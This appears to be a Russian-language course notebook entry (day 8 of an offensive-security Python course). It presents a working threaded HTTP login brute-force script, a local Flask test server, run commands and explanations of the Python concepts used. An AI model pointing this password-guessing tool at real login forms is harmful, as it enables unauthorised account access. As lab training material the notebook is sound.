# День 8 — HTTP Login Brute Force 🔐

## Что изучили
- POST запросы через `requests.post()`
- Определение успеха по тексту ответа (`response.text`)
- Брутфорс веб-форм входа
- `global` переменные в функциях
- Ранний выход из функции через `return`

---

## Итоговый код — day8.py

```python
import requests, argparse, threading
from concurrent.futures import ThreadPoolExecutor

parser = argparse.ArgumentParser()
parser.add_argument('url')
parser.add_argument('--wordlist', default='passwords.txt')
parser.add_argument('--username', default='admin')
args = parser.parse_args()
lock = threading.Lock()
found = False

with open(args.wordlist, 'r') as f:
    passwords = f.read().splitlines()

def try_password(password):
    global found
    if found:
        return
    data = {
        'username': args.username,
        'password': password
    }
    response = requests.post(args.url, data=data, timeout=3)
    if 'welcome' in response.text:
        with lock:
            found = True
            print(f"[+] Пароль найден: {password}")

with ThreadPoolExecutor(max_workers=10) as executor:
    executor.map(try_password, passwords)
```

---

## Тестовый сервер — server.py

```python
from flask import Flask, request
app = Flask(__name__)

@app.route('/login', methods=['POST'])
def login():
    if request.form['password'] == 'secret123':
        return 'welcome!'
    return 'invalid password'

app.run(port=8080)
```

---

## Как запустить

```bash
# Создать wordlist паролей
echo -e "admin\n123456\npassword\nsecret123\nqwerty" > passwords.txt

# Запустить тестовый сервер (в отдельном терминале)
python3 server.py

# Запустить брутфорс
python3 day8.py http://127.0.0.1:8080/login --wordlist passwords.txt

# С другим именем пользователя
python3 day8.py http://127.0.0.1:8080/login --username root
```

---

## Пример вывода

```
[+] Пароль найден: secret123
```

---

## Ключевые концепции

### GET vs POST
| Метод | Для чего | Пример |
|---|---|---|
| `GET` | Получить страницу | Открыть сайт |
| `POST` | Отправить данные | Нажать "Войти" |

### requests.post()
```python
# Отправка данных формы
data = {
    'username': 'admin',
    'password': '123456'
}
response = requests.post(url, data=data, timeout=3)
```

### global — доступ к внешней переменной
```python
found = False  # переменная в основном коде

def try_password(password):
    global found      # говорим: это та самая found снаружи
    if found:
        return        # уже нашли — выходим из функции
    found = True      # меняем снаружи
```

### Признак успеха vs отсутствие ошибки
```python
# ❌ Ненадёжно — любой ответ без "Invalid" считается успехом
if 'Invalid' not in response.text:

# ✅ Надёжно — ищем конкретный признак успешного входа
if 'welcome' in response.text:
```

### Важно — регистр букв!
```python
'welcome' != 'Welcome'  # Python чувствителен к регистру!
```

---

## Новые команды

```python
# POST запрос с данными формы
response = requests.post(url, data={"username": "admin", "password": "123"})

# Текст ответа сервера
response.text

# Проверка текста ответа
if 'welcome' in response.text:
    print("Успех!")

# global переменная
global found
if found:
    return
```

---

## Прогресс курса

| День | Тема | Статус |
|---|---|---|
| День 1 | Сокеты, TCP клиент, banner grabbing | ✅ |
| День 2 | JSON отчёты | ✅ |
| День 3 | argparse CLI | ✅ |
| День 4 | Threading, ThreadPoolExecutor | ✅ |
| День 5 | SSH Brute Force (paramiko) | ✅ |
| День 6 | HTTP разведка с requests | ✅ |
| День 7 | Subdomain Enumeration | ✅ |
| День 8 | HTTP Login Brute Force | ✅ |

---

*Python для Offensive Security — 50 дней*
